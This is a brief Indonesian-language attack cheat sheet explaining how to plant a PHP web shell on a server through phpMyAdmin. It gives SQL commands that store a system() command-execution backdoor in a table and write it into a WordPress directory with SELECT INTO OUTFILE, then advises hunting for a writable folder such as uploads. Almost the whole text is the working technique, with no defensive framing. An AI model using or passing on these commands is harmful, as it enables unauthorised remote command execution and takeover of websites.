# Upload Shell Via phpMyAdmin
Syarat :
* Harus tau writable folder, misal `/var/www/html` atau `/var/www/html/web/customdir`

Command :

```
use mydb;
CREATE TABLE temptab (codetab text);
INSERT INTO temptab (codetab) values ("<?php if(isset($_REQUEST['cmd'])){ echo '<pre>'; $cmd = ($_REQUEST['cmd']); system($cmd); echo '</pre>''; die; }?>");
SELECT * INTO OUTFILE '/var/www/html/wordpress/upload.php' from temptab
DROP TABLE temptab;
FLUSH LOGS;

```

Perintah diatas tidak harus menggunakan db `mydb`, bisa yang lain, contohnya db `mysql`. Perhatikan perintah pada `SELECT * INTO OUTFILE` ini yang dimaksud bahwa kita harus mencari writable folder, cari terus sampai dapat. Kalau wordpress biasanya di folder uploads